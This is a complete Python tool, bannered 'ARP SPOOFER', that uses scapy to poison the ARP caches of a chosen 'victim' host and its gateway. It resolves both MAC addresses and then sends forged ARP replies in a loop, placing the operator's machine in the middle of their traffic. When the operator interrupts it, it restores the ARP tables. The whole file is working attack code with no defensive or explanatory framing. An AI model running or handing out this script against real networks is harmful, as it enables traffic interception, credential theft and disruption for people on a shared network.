#!/usr/bin/env python

import scapy.all as scapy
import subprocess
import time
from colorama import Fore, Style
import argparse


'''
LOGO
'''
print(Fore.YELLOW + Style.BRIGHT + r'''

//   ______  _______  _______        ______  _______   ______   ______  ________ ________ _______  
//  /      \|       \|       \      /      \|       \ /      \ /      \|        \        \       \ 
// |  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\    |  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓\
// | ▓▓__| ▓▓ ▓▓__| ▓▓ ▓▓__/ ▓▓    | ▓▓___\▓▓ ▓▓__/ ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓__   | ▓▓__   | ▓▓__| ▓▓
// | ▓▓    ▓▓ ▓▓    ▓▓ ▓▓    ▓▓     \▓▓    \| ▓▓    ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  \  | ▓▓  \  | ▓▓    ▓▓
// | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓      _\▓▓▓▓▓▓\ ▓▓▓▓▓▓▓| ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓▓▓▓  | ▓▓▓▓▓  | ▓▓▓▓▓▓▓\
// | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓          |  \__| ▓▓ ▓▓     | ▓▓__/ ▓▓ ▓▓__/ ▓▓ ▓▓     | ▓▓_____| ▓▓  | ▓▓
// | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓           \▓▓    ▓▓ ▓▓      \▓▓    ▓▓\▓▓    ▓▓ ▓▓     | ▓▓     \ ▓▓  | ▓▓
//  \▓▓   \▓▓\▓▓   \▓▓\▓▓            \▓▓▓▓▓▓ \▓▓       \▓▓▓▓▓▓  \▓▓▓▓▓▓ \▓▓      \▓▓▓▓▓▓▓▓\▓▓   \▓▓
// by -------- WX            
''' + Fore.LIGHTYELLOW_EX)


'''
GLOBALS
'''
ip_victim = ''


'''
ARGS PARSER & VALIDATOR
'''
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--ip_victim', dest='ip_victim', help="Victims's IP")
args = parser.parse_args()


if args.ip_victim:
    ip_victim = args.ip_victim
else:
    ip_victim = input(Fore.LIGHTWHITE_EX + Style.BRIGHT + "[~]" + Fore.LIGHTWHITE_EX + " Please Enter victim's IP: ")


'''
FINDING VICTIM'S MAC ADDRESS
'''
arp_request = scapy.ARP(pdst=ip_victim)
broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
arp_request_broadcast = broadcast/arp_request
answered = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
for element in answered:
    mac_victim = element[1].hwsrc
try:
    len(mac_victim)
except:
    print('\n' + Style.BRIGHT + Fore.RED + "[*] Can't find victim. Try to enter other IP")
    print(Style.BRIGHT + Fore.RED + '[*]' + Fore.RED + Style.BRIGHT + ' Quitting....')
    exit(0)


'''
FINDING ROUTE'S MAC ADDRESS
'''
arp_request = scapy.ARP(pdst=subprocess.getoutput('route -n').split()[13])
broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
arp_request_broadcast = broadcast/arp_request
answered = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
for element in answered:
    mac_route = element[1].hwsrc


'''
SPOOFING
'''
def spoof():
    packet = scapy.ARP(op=2, pdst=ip_victim, hwdst=mac_victim, psrc=subprocess.getoutput('route -n').split()[13])
    scapy.send(packet, verbose=False)
    packet = scapy.ARP(op=2, pdst=subprocess.getoutput('route -n').split()[13], hwdst=mac_route, psrc=ip_victim)
    scapy.send(packet, verbose=False)


'''
RESTORING DEFAUL SETTINGS
'''
def re():
    packet = scapy.ARP(op=2, pdst=ip_victim, hwdst=mac_victim, psrc=subprocess.getoutput('route -n').split()[13], hwsrc=mac_route)
    scapy.send(packet, count=4, verbose=False)
    packet = scapy.ARP(op=2, pdst=subprocess.getoutput('route -n').split()[13], hwdst=mac_route, psrc=ip_victim, hwsrc=mac_victim)
    scapy.send(packet, count=4, verbose=False)


'''
RUN & EXIT
'''
packets_count = 0
try:
    while True:
        spoof()
        packets_count += 2
        print(Fore.YELLOW + Style.BRIGHT + '\r[+] Packets sent: ' + str(packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n' + Style.BRIGHT + Fore.LIGHTYELLOW_EX + '[*]' + Fore.WHITE + Style.BRIGHT + ' Restoring settings...')
    re()
    print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + '[*]' + Fore.WHITE + Style.BRIGHT + ' Successfully restored settings ')
    print(Style.BRIGHT + Fore.RED + '[*]' + Fore.RED + Style.BRIGHT + ' Quitting....')
    exit(0)
